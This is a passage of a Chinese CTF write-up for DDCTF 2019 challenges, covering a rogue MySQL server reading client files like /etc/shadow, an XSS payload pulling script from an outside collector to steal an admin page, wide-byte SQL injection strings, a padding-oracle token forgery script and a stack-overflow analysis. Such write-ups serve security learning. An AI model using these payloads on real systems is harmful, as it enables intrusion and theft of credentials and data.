        <span class="n">your_ticket</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'data'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s1">'your_ticket'</span><span class="p">]</span>
        <span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span>
            <span class="p">{</span>
                <span class="s1">'id'</span><span class="p">:</span> <span class="n">your_id</span><span class="p">,</span>
                <span class="s1">'ticket'</span><span class="p">:</span> <span class="n">your_ticket</span><span class="p">,</span>
                <span class="s1">'session'</span><span class="p">:</span> <span class="n">session</span>
            <span class="p">}</span>
        <span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'</span><span class="si">%s</span><span class="s1">, </span><span class="si">%s</span><span class="s1">, </span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">your_id</span><span class="p">,</span> <span class="n">your_ticket</span><span class="p">))</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s1">'/ctf/api/remove_robot?id=</span><span class="si">%s</span><span class="s1">&amp;ticket=</span><span class="si">%s</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">your_id</span><span class="p">,</span> <span class="n">your_ticket</span><span class="p">)</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'session'</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

            <span class="n">url</span> <span class="o">=</span> <span class="n">base_url</span> <span class="o">+</span> <span class="s1">'/ctf/api/get_flag'</span>
            <span class="n">r</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s1">'session'</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">())</span>
            <span class="k">if</span> <span class="s1">'大吉大利，今晚吃鸡'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'msg'</span><span class="p">]:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">'data'</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span>
                <span class="k">break</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
        <span class="k">pass</span>
</pre></div>
<p>得到flag，另外本题有非预期解，详见下一题。</p>
<pre><code>{'code': 200, 'data': ['DDCTF{chiken_dinner_hyMCX[n47Fx)}'], 'msg': '大吉大利，今晚吃鸡'}</code></pre>
<h3 data-content="1" id="c981a36655f197498a773a3a4eefb923">mysql弱口令</h3>
<p><a href="http://117.51.147.155:5000/index.html#/scan" target="_blank">http://117.51.147.155:5000/index.html#/scan</a></p>
<p>部署<a href="http://38.106.21.229:5100/agent.py" target="_blank">agent.py</a>再进行扫描哦~</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418133936-5a1b5d8a-619c-1.png"/></p>
<p>题目是一个mysql弱口令扫描器，输入主机IP及mysql端口可以进行扫描，扫描器会先连接<code>agent.py</code>起的端口<code>8123</code>，并且通过命令<code>netstat -ntlp</code>检查主机端口开放情况，会检查是否存在<code>mysqld</code>进程。以前遇到的sql题目，一般我们作为客户端，对服务端进行注入等恶意攻击，这题刚好相反，题目是一个扫描器（客户端），而我们提供一个服务端。</p>
<ol>
<li>用<code>mysql 读取 客户端 数据</code>作为关键字搜索，可以找到不少文章</li>
</ol>
<p><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank">MySQL LOAD DATA 读取客户端任意文件</a></p>
<p>原理是在mysql客户端连接到服务端的时候可以请求客户端的本地文件，可以通过伪造 <code>file-transfer</code> 请求实现任意文件读取，使用文章里面提到的工具：</p>
<p><a href="https://github.com/allyshka/Rogue-MySql-Server" target="_blank">https://github.com/allyshka/Rogue-MySql-Server</a></p>
<p>可以修改端口，以及修改filelist为我们想读取的文件</p>
<div class="highlight"><pre><span></span><span class="n">filelist</span> <span class="o">=</span> <span class="p">(</span>
    <span class="s1">'/etc/shadow'</span><span class="p">,</span>
<span class="p">)</span>
</pre></div>
<ol>
<li>下载并启动<code>agent.py</code>，由于扫描器会检查是否有mysqld进程，可以将<code>python</code>软链接成<code>mysqld</code>再启动<code>rogue_mysql_server.py</code>。</li>
</ol>
<div class="highlight"><pre><span></span>ln -s /usr/bin/python mysqld
mysqld rogue_mysql_server.py
</pre></div>
<ol>
<li>在扫描器中输入伪造MySQL服务的IP和端口，注意脚本都要用root权限运行，不然会出错。首先测试了一下读取<code>/etc/passwd</code>
</li>
</ol>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134013-6fd1ff80-619c-1.png"/></p>
<ol>
<li>开始各种读文件的找FLAG之旅</li>
</ol>
<p>读取<code>/proc/self/cmdline</code> 可以看到启动命令</p>
<div class="highlight"><pre><span></span>/home/dc2-user/ctf_web_2/ctf_web_2/bin/python2 /home/dc2-user/ctf_web_2/ctf_web_2/bin/gunicorn didi_ctf_web2:app -b <span class="m">127</span>.0.0.1:15000 --access-logfile /home/dc2-user/ctf_web_2/2_access.log
</pre></div>
<p>是flask起的web，读取<code>/home/dc2-user/ctf_web_2/app/main/views.py</code>，里面有提示flag在security数据库的flag表里面：</p>
<div class="highlight"><pre><span></span><span class="c1"># flag in mysql  curl@localhost database:security  table:flag</span>
</pre></div>
<p>读取mysql的数据库文件<code>/var/lib/mysql/security/flag.ibd</code>，flag明文存放在数据库中</p>
<div class="highlight"><pre><span></span><span class="c1"># kira @ k1r4 in ~/web/ddctf [21:09:55]</span>
$ strings flag.ibd
z<span class="o">[</span>jx
infimum
supremum
DDCTF<span class="o">{</span>0b5d05d80cceb4b85c8243c00b62a7cd<span class="o">}</span>
</pre></div>
<p>番外篇：读取一下<code>/home/dc2-user/.bash_history</code>，发现了有趣的东西，这个服务器还有<code>ctf_web_1</code></p>
<div class="highlight"><pre><span></span>mv ctf.zip  /home/dc2-user/ctf_web_1/web_1
</pre></div>
<p>猜测存在文件<code>/home/dc2-user/ctf_web_1/web_1/main/views.py</code>，直接拿到了吃鸡那题的flag，这就是上面提到的非预期解。</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">redirect</span>
<span class="kn">from</span> <span class="nn">app</span> <span class="kn">import</span> <span class="n">mongodb</span>
<span class="kn">from</span> <span class="nn">app.unitis.tools</span> <span class="kn">import</span> <span class="n">get_md5</span><span class="p">,</span> <span class="n">num64_to_32</span>
<span class="kn">from</span> <span class="nn">app.main.db_tools</span> <span class="kn">import</span> <span class="n">get_balance</span><span class="p">,</span> <span class="n">creat_env_db</span><span class="p">,</span> <span class="n">search_bill</span><span class="p">,</span> <span class="n">secrity_key</span><span class="p">,</span> <span class="n">get_bill_id</span>
<span class="kn">import</span> <span class="nn">uuid</span>
<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">unquote</span>

<span class="n">mydb</span> <span class="o">=</span> <span class="n">mongodb</span><span class="o">.</span><span class="n">db</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s1">'''DDCTF{chiken_dinner_hyMCX[n47Fx)}'''</span>
</pre></div>
<h3 data-content="1" id="d88de5b981cf1b77a599b0d4b5c13cf9">欢迎报名DDCTF</h3>
<p><a href="http://117.51.147.2/Ze02pQYLf5gGNyMn/" target="_blank">http://117.51.147.2/Ze02pQYLf5gGNyMn/</a></p>
<p>提示xss，尝试把html源码x回来，payload：<code>&lt;script src=//xsspt.com/NyU2Mx&gt;&lt;/script&gt;</code>，获取到<code>admin.php</code>的html源码</p>
<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
    <span class="c">&lt;!--每隔30秒自动刷新--&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">"refresh"</span> <span class="na">content</span><span class="o">=</span><span class="s">"30"</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DDCTF报名列表<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/javascript"</span> <span class="na">src</span><span class="o">=</span><span class="s">"https://xsspt.com/js/html2canvas.js"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">table</span> <span class="na">align</span><span class="o">=</span><span class="s">"center"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">thead</span><span class="p">&gt;</span>
            <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>姓名<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>昵称<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>备注<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">th</span><span class="p">&gt;</span>时间<span class="p">&lt;/</span><span class="nt">th</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
        <span class="p">&lt;/</span><span class="nt">thead</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">tbody</span><span class="p">&gt;</span>
            <span class="c">&lt;!-- 列表循环展示 --&gt;</span>
                        <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span> 321 <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span> 3333 <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">"//xsspt.com/NyU2Mx"</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span> 2019-04-17 02:02:46 <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>

            <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
                        <span class="p">&lt;</span><span class="nt">tr</span><span class="p">&gt;</span>
                <span class="p">&lt;</span><span class="nt">td</span><span class="p">&gt;</span>
                    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span> <span class="na">href</span><span class="o">=</span><span class="s">"index.php"</span><span class="p">&gt;</span>报名<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
                <span class="p">&lt;/</span><span class="nt">td</span><span class="p">&gt;</span>
            <span class="p">&lt;/</span><span class="nt">tr</span><span class="p">&gt;</span>
            <span class="c">&lt;!-- &lt;a target="_blank"  href="query_aIeMu0FUoVrW0NWPHbN6z4xh.php"&gt; 接口 &lt;/a&gt;--&gt;</span>
        <span class="p">&lt;/</span><span class="nt">tbody</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">table</span><span class="p">&gt;</span>


<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div>
<p>访问<code>http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php</code>提示需要参数<code>id</code>，添加参数后没有回显。</p>
<p>下午各种测试无回显，晚上进行测试发现是<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134115-94de33ac-619c-1.png"/>，简单测试一下</p>
<p>然后开始手工注入</p>
<pre><code>id=-1%bf%27+union+select+1,2,3,4,group_concat(schema_name)+from+information_schema.schemata%23

information_schema,ctfdb,say

###########################
id=-1%bf%27+union+select+1,2,3,4,group_concat(table_name)+from+information_schema.tables+where+table_schema=concat(char(99),char(116),char(102),char(100),char(98))%23

ctf_fhmHRPL5

###########################
id=-1%bf%27+union+select+1,2,3,4,group_concat(column_name)+from+information_schema.columns+where+table_name=concat(char(99),char(116),char(102),char(95),char(102),char(104),char(109),char(72),char(82),char(80),char(76),char(53))%23

ctf_value

##########################
id=-1%bf%27+union+select+1,2,3,4,ctf_value+from+ctfdb.ctf_fhmHRPL5%23

DDCTF{GqFzOt8PcoksRg66fEe4xVBQZwp3jWJS}</code></pre>
<p>当然用sqlmap也是可以的，命令如下：</p>
<pre><code>python sqlmap.py -u "http://117.51.147.2/Ze02pQYLf5gGNyMn/query_aIeMu0FUoVrW0NWPHbN6z4xh.php?id=1" --tamper unmagicquotes --dbms Mysql --dbs --hex</code></pre>
<h3 data-content="1" id="dc961744b0d73245876f7d33468da645">再来1杯Java</h3>
<p>绑定Host访问：</p>
<p>116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com</p>
<p>提示1：JRMP</p>
<p><a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/" target="_blank">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/</a></p>
<p>进入网站提示：<code>Try to become an administrator.</code>，留意到cookie中有token字段，在 <a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info" target="_blank">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/account_info</a> 中可以查询到解密结果为<code>{"id":100,"roleAdmin":false}</code>，那么思路就是CBC字节反转，伪造token为<code>{"id":100,"roleAdmin":true}</code>，脚本如下：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">sxor</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">):</span>
    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">^</span><span class="nb">ord</span><span class="p">(</span><span class="n">y</span><span class="p">))</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)])</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">string</span><span class="p">,</span><span class="n">N</span><span class="p">):</span>
    <span class="n">l</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">l</span><span class="o">!=</span><span class="n">N</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">string</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="n">l</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">N</span><span class="o">-</span><span class="n">l</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">get_api</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):</span>
    <span class="n">req_header</span><span class="o">=</span><span class="p">{</span><span class="s1">'X-Forwarded-For'</span><span class="p">:</span> <span class="s1">'113.71.226.6'</span><span class="p">,</span>
<span class="s1">'User-Agent'</span><span class="p">:</span><span class="s1">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063'</span><span class="p">,</span>
<span class="s1">'Host'</span><span class="p">:</span><span class="s1">'c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023'</span><span class="p">,</span>
<span class="s1">'Referer'</span><span class="p">:</span><span class="s1">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/home'</span><span class="p">,</span>
<span class="s1">'Cookie'</span><span class="p">:</span><span class="s1">'token={}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">ciphertext</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span>
<span class="p">}</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> 
    <span class="n">rsp</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/gen_token'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">req_header</span><span class="p">,</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">stream</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
    <span class="k">return</span><span class="p">(</span><span class="n">rsp</span><span class="o">.</span><span class="n">content</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">padding_oracle</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">N</span><span class="p">):</span>
    <span class="n">get</span> <span class="o">=</span> <span class="s2">""</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">N</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
            <span class="n">padding</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">get</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">i</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
            <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">N</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">cipher</span>
            <span class="n">payload</span><span class="o">=</span><span class="s1">'PadOracle:iv/cbc'</span> <span class="o">+</span> <span class="n">c</span>
            <span class="n">get_api_return</span><span class="o">=</span><span class="n">get_api</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="k">if</span> <span class="s2">"decrypt err~"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">get_api_return</span><span class="p">:</span>
                <span class="n">get</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span> <span class="o">^</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">get</span>
                <span class="c1"># print(get.encode('hex'))</span>
                <span class="k">break</span>
    <span class="k">return</span> <span class="n">get</span>

<span class="n">token</span> <span class="o">=</span> <span class="s1">'UGFkT3JhY2xlOml2L2NiY8O+7uQmXKFqNVUuI9c7VBe42FqRvernmQhsxyPnvxaF'</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)</span>
<span class="n">ciphertxt</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
<span class="n">iv</span> <span class="o">=</span> <span class="n">token</span><span class="p">[:</span><span class="mi">16</span><span class="p">]</span> <span class="c1"># PadOracle:iv/cbc</span>
<span class="n">org_plaintxt</span> <span class="o">=</span> <span class="s1">'{"id":100,"roleAdmin":false}</span><span class="se">\x04\x04\x04\x04</span><span class="s1">'</span>
<span class="n">evil_plaintxt</span> <span class="o">=</span> <span class="s1">'{"id":100,"roleAdmin":true}</span><span class="se">\x05\x05\x05\x05\x05</span><span class="s1">'</span>

<span class="n">ciphertxt2</span> <span class="o">=</span> <span class="n">ciphertxt</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>
<span class="n">imtermediary2</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">org_plaintxt</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="n">ciphertxt</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
<span class="c1"># print imtermediary2.encode('hex')</span>
<span class="n">ciphertxt1</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">evil_plaintxt</span><span class="p">[</span><span class="mi">16</span><span class="p">:],</span><span class="n">imtermediary2</span><span class="p">)</span>
<span class="c1"># print sxor(imtermediary2,evil_plaintxt[16:]).encode('hex'),evil_plaintxt[16:]</span>
<span class="n">imtermediary1</span> <span class="o">=</span> <span class="n">padding_oracle</span><span class="p">(</span><span class="n">ciphertxt1</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="c1"># print imtermediary1.encode('hex')</span>
<span class="n">iv_fixed</span> <span class="o">=</span> <span class="n">sxor</span><span class="p">(</span><span class="n">imtermediary1</span><span class="p">,</span><span class="n">org_plaintxt</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>
<span class="c1"># </span>
<span class="k">print</span> <span class="p">(</span><span class="n">iv_fixed</span><span class="o">+</span><span class="n">ciphertxt1</span><span class="o">+</span><span class="n">ciphertxt2</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)</span>
</pre></div>
<p>修改token为<code>e/0YtlMi8D4jOD4Uk+gE2sO+7uQmXLN5LEM2W9Y6VRa42FqRvernmQhsxyPnvxaF</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134559-3e1b6200-619d-1.png"/></p>
<p>得到了一个1.txt</p>
<pre><code>Try to hack~ 
Hint:
1. Env: Springboot + JDK8(openjdk version "1.8.0_181") + Docker~ 
2. You can not exec commands~</code></pre>
<p>发现可以任意文件读取 <a href="http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=/etc/passwd" target="_blank">http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/api/fileDownload?fileName=/etc/passwd</a></p>
<p><code>/proc/self/fd/xxx</code> 可以查看该进程打开的文件，经测试访问 <code>/api/fileDownload?fileName=/proc/self/fd/15</code> 拿到网站源码</p>
<p>反编译class文件后拿到java源码，有一个DeserializeDemoController比较可疑</p>
<p>fastjson 版本是 1.2.51 好像没有漏洞，而且用了SerialKiller。1.txt 提示无法执行命令。</p>
<p>【未完待续】</p>
<h2 data-content="1" id="0ececf8b3d24d99cabb6831990cd933d">MISC</h2>
<h3 data-content="1" id="60cebccdd29e03cae5f2de9200bdcfda">[PWN] strike</h3>
<pre><code>[*] '/home/kira/pwn/ddctf/xpwn'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre>
<p>漏洞一：无初始化内存，导致内存泄露</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">sub_80485DB</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">,</span> <span class="kt">FILE</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-48h]</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter username: "</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fprintf</span><span class="p">(</span><span class="n">a2</span><span class="p">,</span> <span class="s">"Hello %s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>动态调试，可以发现内存里面有栈地址，以及libc地址，填充0x28位字符，即可泄露</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190418134617-48f34d96-619d-1.png"/></p>
<p>漏洞二：输入长度为有符号数，长度判断没有判断是否为负数，导致栈溢出</p>
<div class="highlight"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// eax</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-4Ch]</span>
  <span class="kt">size_t</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [esp+40h] [ebp-Ch]</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+44h] [ebp-8h]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a1</span><span class="p">;</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">input_name</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">stdout</span><span class="p">);</span>
  <span class="n">sleep</span><span class="p">(</span><span class="mi">1u</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Please set the length of password: "</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="n">get_int</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">nbytes</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="p">)</span> <span class="c1">// 负数绕过</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Too long!"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Enter password(lenth %u): "</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="n">nbytes</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"All done, bye!"</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>长度那里输入<code>-1</code>，即可获得<code>4294967295</code>长度的输入，不过这里不是一般的栈溢出，具体需要分析汇编代码</p>
<div class="highlight"><pre><span></span><span class="nl">.text:</span><span class="err">08048732</span>                 <span class="nf">add</span>     <span class="no">esp</span><span class="p">,</span> <span class="mi">10</span><span class="no">h</span>
<span class="nl">.text:</span><span class="err">08048735</span>                 <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="nl">.text:</span><span class="err">0804873</span><span class="nf">A</span>                 <span class="no">lea</span>     <span class="no">esp</span><span class="p">,</span> <span class="p">[</span><span class="no">ebp-8</span><span class="p">]</span>
<span class="nl">.text:</span><span class="err">0804873</span><span class="nf">D</span>                 <span class="no">pop</span>     <span class="no">ecx</span>
